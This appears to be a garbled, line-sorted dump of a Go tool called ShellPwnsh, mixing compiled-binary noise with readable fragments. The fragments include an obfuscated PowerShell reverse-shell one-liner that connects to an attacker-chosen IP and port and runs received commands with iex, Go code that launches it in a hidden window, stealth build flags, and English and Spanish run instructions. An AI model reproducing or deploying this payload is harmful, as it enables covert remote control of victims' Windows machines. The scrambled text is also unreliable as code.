@@ -1,0 +1,204 @@
+"`  ""os/exec"""
+"`  ""syscall"""
+"`  ""time"""
+"` + ""\n\t"" + time + "
+"` := """""
+"`"" + letters + """
+"`"" ,"
+"`"""
+"`""6"
+"`""HD$hH\$PHL$HHl$pHxHD$"
+"`""S%U0J"
+"`""W"
+"`$x = 'UwBvAGM'; $xd = 'AawBlA'; $client = New-Object System.Net.$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('{0}{1}HQAcwA=' -f $x, $xd)))).TCPClient("""
+"`);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = ('{0}PS ' -f $sb) + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes(('{0}') -f $sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};('{0}.Close()' -f $client)"
+"`.Command(""powershell"", ""-c"", "
+"`3$Z,c	#YG"
+"`8J:,8mv3>"
+"`Fa,rf=n,"
+"`GOOS=windows GOARCH=amd64 go build -ldflags ""-H windowsgui -s -w"" "
+"`L$hHLd$xHT$XL""ALd$xL$h\$lH|$"
+"`L$hHLd$x{HT$XL""ALd$xL$h\$lH|$"
+"`\,6{"
+"`dMd"""
+"`go build -ldflags ""-H windowsgui -s -w"" "
+"`r$Jb[@O;,(6rcH"
+` * 
+` + Ip + 
+` + Port + 
+` + code + 
+` + exec + 
+` + syscall + 
+` := 
+` ef
+`!9Bn> OgC9!
+`#co/
+`#|W~e+~^
+`$*5
+`&t
+`(1
+`(Mi(H9s6L\$8LT$0Ll$
+`(Qz
+`)
+`*sM)_
+`.
+`.SysProcAttr = &
+`.SysProcAttr{HideWindow: true}
+`0_H
+`1
+`11HHl$XH
+`11HHl$pHxHD$
+`11Hl$HHPGHHHD$XH\$
+`1HHHl$XH
+`1H|$(Ht$hHT$(LBHD$XHL$hH\$
+`2|
+`2|@	!e*9w)
+`3
+`3|b
+`4>
+`6'f5Yy$
+`7
+`8
+`8\=$
+`8of
+`:_i
+`;
+`;1A:
+`>
+`>;^n\
+`>B]nq)j
+`?#E
+`@
+`A
+`C
+`Cws>
+`D01n
+`E1+LL$
+`Ejecutar binario compilado con ./ShellPwnsh
+`Ejecutar el binario compilado
+`Execute the compiled binary
+`H<HuyHT$
+`HBHHZPHJXHD$xZHT$
+`HBHHZPHJXHD$xnUHT$
+`HD$
+`HD$XHL$HHT$PH\$h|$8LD$
+`HD$hH\$
+`HD$xHHvHT$
+`HHHHl$XH
+`HL$
+`HL$0HL$hHL$
+`HL$8HL$
+`HL$XH\$PHD$H	HD$HH\$PHL$XH|$
+`HL$XH\$PHD$HiHD$HH\$PHL$XH|$
+`HL$hH\$
+`HL$hH|$pHt$xHD$@H\$XHL$
+`HL$pH\$ HP 11Hf;HD$
+`HLLHLHl$XH
+`HT$0H\$8Ht$(H|$hH9|Hl$@HHH
+`HT$0OHL$
+`HT$HH
+`HT$PHT$hHL$pH\$
+`HT$hHt$
+`HZ0HJ8=P
+`H\$(H
+`H\$XHD$P'HL$
+`H\$XHD$PtHL$
+`H\$hL$pH|$xT$
+`H\$hWHD$(HL$HlH|$HHD$
+`Have Golang installed
+`Hh111Hl$
+`Hh11HI1HHl$
+`HhHD$0H\$8HL$@Hl$
+`HhHD$8H\$@HL$H@|$P@t$QLD$XDL$
+`HhHD$HH\$8Hl$
+`HhHH11Hl$
+`HhHl$
+`HhzHD$0H\$8HL$@Hl$
+`Hl$
+`Hl$XH
+`Hm
+`Hs
+`Ht$XuHH11Hl$
+`Ht$hH\$PHD$H3HT$HHr(HD$PH\$0HL$(HD$HH\$PHt$hH|$
+`Ht$xH)HT$
+`Ht$xH|$@HT$8}HD$XHL$hH\$
+`Ht&HL$
+`H|$
+`H|$XHT$
+`H|$XH\$PHD$HH
+`H|$XLD$@Mt	I
+`Jx
+`K
+`KH
+`LD$HLL$XLT$pH|$hHD$PLHH|$
+`LD$XLD$
+`LL$hHT$
+`LNT$
+`L\$hHD$(H\$0HL$8H|$@Ht$HLD$PLL$XLT$
+`L\$hf[HD$(H\$0HL$8H|$@Ht$HLD$PLL$XLT$
+`L\$hf{HD$(H\$0HL$8H|$@Ht$HLD$PLL$XLT$
+`L|o
+`M;0}CAP
+`O  ejecutar el archivo ShellPwnsh.go
+`Or
+`Or run the ShellPwnsh.go file
+`PXT$pP\T$tP
+`Q
+`Run binary compiled with ./ShellPwnsh
+`SU
+`Tener Golang instalado
+`V(T
+`VJ3:IP
+`Xc2mJ~ Cg
+`Y
+`Y&cb8B
+`YHD$0HL$ HD$0H\$
+`Yl
+`[0
+`\$<#!HT$
+`\7
+`\LpDw
+`]w
+`__L
+``
+``K-
+`apt update && apt install golang
+`b
+`c2?Fj
+`cd source && go run ShellPwnsh.go
+`d9+~3s
+`e_R
+`e}Q33
+`fAR
+`fAT$
+`fq
+`fr
+`g
+`go[_
+`h
+`j
+`jM
+`jho2Bc
+`kHD$
+`l
+`lb03
+`m9.
+`n$
+`o
+`o ejecutar el archivo ShellPwnsh.go de source
+`oc{\
+`or run the ShellPwnsh.go file from source
+`pV
+`q
+`r
+`rHt	HD$h1CHD$XH\$
+`rfAp
+`rfw
+`s+
+`w7PjbE7
+`waA>l%tjt
+`y*UgKc.c
+`z
+`|D]
+`}
+`~]%
